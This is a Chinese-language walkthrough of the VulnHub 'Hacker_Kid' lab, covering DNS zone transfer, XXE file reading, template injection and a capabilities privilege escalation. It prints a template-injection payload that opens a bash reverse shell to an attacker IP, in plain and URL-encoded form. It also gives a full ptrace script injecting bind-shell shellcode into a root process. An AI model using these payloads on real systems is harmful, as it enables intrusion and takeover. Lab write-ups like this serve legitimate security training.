---
title: VulnHub靶场 Hacker_Kid
description: VulnHub靶场 Hacker_Kid WP
pubDate: 11 10 2024
image: https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-38.webp
categories:
  - 网络安全
tags:
  - 靶场
  - 渗透测试
---

## 主机发现

主机发现

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-1.webp)

得到目标 IP 为 `192.168.111.136`，对其进行端口扫描

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-2.webp)

开放了 80 和 9999 端口，80 界面如下

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-3.webp)

9999 界面如下

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-4.webp)

## DNS 区域传送

对登录框进行弱口令测试，失败。回去看 80 端口的 web 页面。页面上有三个子页面

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-5.webp)

点击 start 跳转 404

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-6.webp)

得到目标服务是一个 Ubuntu 系统，而且当前中间件是 Apache。连接为 `http://192.168.111.136/index.html`。为什么会 404 呢？将 html 后缀改成 php，成功访问

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-7.webp)

点击第二个 app 入口，页面无变化，URL 如下

```
http://192.168.111.136/index.php#app.html
```

尝试访问 `http://192.168.111.136/app.html`，得到如下界面

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-8.webp)

经过测试，这些按钮一点用没有。发现此时顶部栏发生变化

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-9.webp)

点击 `Form example`，跳转到如下界面

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-10.webp)

填写内容，启动 Burp 抓包，啥也没有。尝试目录爆破，结果如下

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-11.webp)

啥用没有。查看目标源码，发现在 `index.php` 下存在提示

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-12.webp)

内容如下

```html
TO DO: Use a GET parameter page_no to view pages. -->
<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
```

提示创建一个 GET 请求参数 `page_no` 去访问页面，感觉可能是文件包含，构建 URL `http://192.168.111.136/index.php?page_no`，尝试访问，发现页面发生变化

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-13.webp)

要深入了解点？尝试传入参数，手动测的太慢了，用 burp 跑

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-14.webp)

参数值为 21 的时候，发生变化

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-15.webp)

给了一个域名 `hackers.blackhat.local` 将其加入 Hosts 中，进行访问

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-16.webp)

好吧，没变化。不过他既然说创建了子域名，我们可以尝试去看看有没有其他的子域。我们可以用 nslookup 进行区域传送

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-17.webp)

发现一个新的域名 `hackerkid.blackhat.local` 将其加入 Hosts 中访问，跳转到如下界面

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-18.webp)

## XXE 注入

我们在得到的页面里创建一个用户

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-19.webp)

报错。抓包查看

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-20.webp)

请求体是一个 XML 格式，我们尝试 XXE 攻击。注意，我们要注入的地方是 `email` 这里

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-21.webp)

成功。然后就是读文件了，我们这里发现了一个用户 `saket`

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-22.webp)

我们尝试读取这个用户下的配置文件

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-23.webp)

从中得到了一个用户名和账户密码

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-24.webp)

```
username="admin"
password="Saket!#$%@!!"
```

我们回到 9999 端口下的页面，尝试登录。登录失败。

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-25.webp)

我们是 `saket` 用户下得到的这个账户密码，那试试直接以 `saket` 作为用户登录。

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-26.webp)

登录成功

## SSTI 注入

页面显示内容如下

```

Tell me your name buddy

How can i get to know who are you ??

logout
```

告诉他 name，可能是传参，尝试 GET 请求传参 name

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-27.webp)

此处是我们输出什么就返回什么。我们这里瞎输入一个，比如我这里输入的是 `dksadkWQAP{OKDawDADaklw;d+_}{{}?":":D:LAW"PLDPWALKDklas;daw`

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-28.webp)

发现返回的结果不同了，在 `;` 后面的结果没有显示，我们把 `;` 去掉呢

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-29.webp)

直接报错了

```
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/tornado/web.py", line 1702, in _execute
    result = method(*self.path_args, **self.path_kwargs)
  File "/usr/local/lib/python3.8/dist-packages/tornado/web.py", line 3173, in wrapper
    return method(self, *args, **kwargs)
  File "/opt/server.py", line 43, in get
    t = tornado.template.Template(template_data)
  File "/usr/local/lib/python3.8/dist-packages/tornado/template.py", line 318, in __init__
    self.file = _File(self, _parse(reader, self))
  File "/usr/local/lib/python3.8/dist-packages/tornado/template.py", line 917, in _parse
    reader.raise_parse_error("Missing end expression }}")
  File "/usr/local/lib/python3.8/dist-packages/tornado/template.py", line 839, in raise_parse_error
    raise ParseError(msg, self.name, self.line)
tornado.template.ParseError: Missing end expression }} at <string>:10
```

我们这里就得到了这个脚本的位置，`/opt/server.py`，我们利用 XXE 注入去文件包含它，得到源码

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-30.webp)

具体代码如下

```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

# 导入Tornado框架所需的模块
import tornado.httpserver
import tornado.ioloop
import tornado.web
import tornado.options
import os.path
from tornado.options import define, options

# 定义一个简单的HTML模板，用于在主页上显示
TEMPLATE = '''
<html>
 <head><title>
  Hello {{ name }} </title></head>
<body bgcolor='black'>
<center>
<font color='red'>
<br>
<br>
Hello FOO
</font>
<center>
<br>
<br><br><br><br><center>
<a href="/logout">logout</a>
</center>
</body>
</html>
'''

# 定义一个命令行选项，用于指定端口号，默认为9999
define("port", default=9999, help="run on the given port", type=int)


# BaseHandler类提供处理登录用户的通用功能
class BaseHandler(tornado.web.RequestHandler):

    # 方法用于根据安全cookie数据获取当前用户
    def get_current_user(self):
        return self.get_secure_cookie("user")


# MainHandler类处理主页请求并显示个性化问候语
class MainHandler(BaseHandler):

    # 方法要求用户已登录（认证）
    @tornado.web.authenticated
    def get(self):
        # 从URL中获取‘name’参数（如果没有提供，则默认为空字符串）
        name = self.get_argument('name', '')
        if name:
            # 如果提供了‘name’，将其插入HTML模板并显示
            template_data = TEMPLATE.replace("FOO", name)
            t = tornado.template.Template(template_data)
            self.write(t.generate(name=name))
        else:
            # 如果未提供‘name’，提示用户输入姓名
            template_data = "<br> <body bgcolor='black'> <center><font color='green'> 告诉我你的名字吧<br><br><br>我怎么知道你是谁呢？</font><br><br><br><br><center><p><font color='red'><a href='/logout'>注销</a></font></body>"
            t = tornado.template.Template(template_data)
            self.write(t.generate(name=name))


# LoginHandler类管理登录过程，包括阻止过多失败的尝试
class LoginHandler(BaseHandler):

    @tornado.gen.coroutine
    def get(self):
        # 检查用户是否超过登录尝试限制
        incorrect = self.get_secure_cookie("incorrect")
        if incorrect and int(incorrect) > 20:
            # 如果超过限制，显示“已阻止”信息
            self.write('<center>已阻止</center>')
            return
        # 否则，渲染登录页面（login.html）
        self.render('login.html')

    @tornado.gen.coroutine
    def post(self):
        # 检索并检查错误登录尝试计数
        incorrect = self.get_secure_cookie("incorrect")
        if incorrect and int(incorrect) > 20:
            self.write('<center>已阻止</center>')
            return

        # 转义并获取表单提交的用户名和密码
        getusername = tornado.escape.xhtml_escape(
            self.get_argument("username"))
        getpassword = tornado.escape.xhtml_escape(
            self.get_argument("password"))

        # 检查用户名和密码是否与硬编码的值匹配
        if "saket" == getusername and "Saket!#$%@!!" == getpassword:
            # 如果登录成功，设置用户的安全cookie并重置尝试计数
            self.set_secure_cookie("user", self.get_argument("username"))
            self.set_secure_cookie("incorrect", "0")
            self.redirect(self.reverse_url("main"))
        else:
            # 如果登录失败，增加错误尝试计数并显示错误信息
            incorrect = self.get_secure_cookie("incorrect") or 0
            increased = str(int(incorrect) + 1)
            self.set_secure_cookie("incorrect", increased)
            self.write("""<center>
                            输入数据有误 (%s)<br />
                            <a href="/">返回首页</a>
                          </center>""" % increased)


# LogoutHandler类处理用户注销，通过清除用户cookie并重定向
class LogoutHandler(BaseHandler):

    def get(self):
        # 清除用户cookie以注销，并重定向到主页
        self.clear_cookie("user")
        self.redirect(self.get_argument("next", self.reverse_url("main")))


# Application类设置Web应用程序的路由和配置
class Application(tornado.web.Application):

    def __init__(self):
        # 设置模板和静态文件的基础目录
        base_dir = os.path.dirname(__file__)
        # 定义应用设置，包括cookie密钥、路径和调试模式
        settings = {
            "cookie_secret": "bZJc2sWbQLKos6GkHn/VB9oXwQt8S0R0kRvJ5/xJ89E=",
            "login_url": "/login",  # 认证的重定向URL
            'template_path': os.path.join(base_dir, "templates"),
            'static_path': os.path.join(base_dir, "static"),
            'debug': True,  # 启用调试模式，便于开发
            "xsrf_cookies": True,  # 启用跨站请求伪造保护
        }

        # 初始化应用程序并设置URL路由到主页、登录和注销
        tornado.web.Application.__init__(self, [
            tornado.web.url(r"/", MainHandler, name="main"),
            tornado.web.url(r'/login', LoginHandler, name="login"),
            tornado.web.url(r'/logout', LogoutHandler, name="logout"),
        ], **settings)


# 应用程序的入口点
def main():
    # 解析命令行选项（如端口号）
    tornado.options.parse_command_line()
    # 启动应用程序并在指定端口监听
    Application().listen(options.port)
    # 启动Tornado I/O循环以处理传入请求
    tornado.ioloop.IOLoop.instance().start()


# 如果脚本是直接运行的，则调用main函数
if __name__ == "__main__":
    main()

```

一眼望去，发现目标存在 SSTI 注入。尝试注入

```python
{% import os %}{{os.system('bash -c "bash -i &> /dev/tcp/192.168.135.192/9000 0>&1"')}}

%7b%25%20%69%6d%70%6f%72%74%20%6f%73%20%25%7d%7b%7b%6f%73%2e%73%79%73%74%65%6d%28%27%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%26%3e%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%33%35%2e%31%39%32%2f%39%30%30%30%20%30%3e%26%31%22%27%29%7d%7d
```

成功拿到 Shell

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-31.webp)

## Capability 提权

上线一下 MSF

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-32.webp)

查找设置了capabilities可执行文件

```sh
getcap -r / 2>/dev/null
```

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-33.webp)

发现 python 有相应的权限。我们查一下当前主机上以 root 用户运行的进程

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-34.webp)

我们这里准备了一个提权脚本，这个脚本的作用就是对 root 权限的进程注入 Python 类型 Shellcode，利用 Pythono 具备的 cap_sys_ptrace+ep 能力实现权限提升，该脚本如果执行成功，会在靶机的本地监听 5600 端口

```python
# inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.
# GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c

import ctypes
import sys
import struct

# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html

PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17

# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct


class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]


libc = ctypes.CDLL("libc.so.6")

pid = int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [
    ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p
]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers = user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))

print("Instruction Pointer: " + hex(registers.rip))

print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db.
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0, len(shellcode), 4):

    # Convert the byte to little endian.
    shellcode_byte_int = int(shellcode[i:4 + i].encode('hex'), 16)
    shellcode_byte_little_endian = struct.pack(
        "<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte = int(shellcode_byte_little_endian, 16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip + i),
                shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip = registers.rip + 2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))

print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

将文件上传后使用 python 运行。

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-35.webp)

这样就注入成功了，此时它就会启动一个 5600 的监听

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-36.webp)

用 nc 连接就行了

![](https://img.trtyr.top/images/blog/VulnHub%E9%9D%B6%E5%9C%BA%20Hacker_Kid/007%20Hacker_Kid-37.webp)
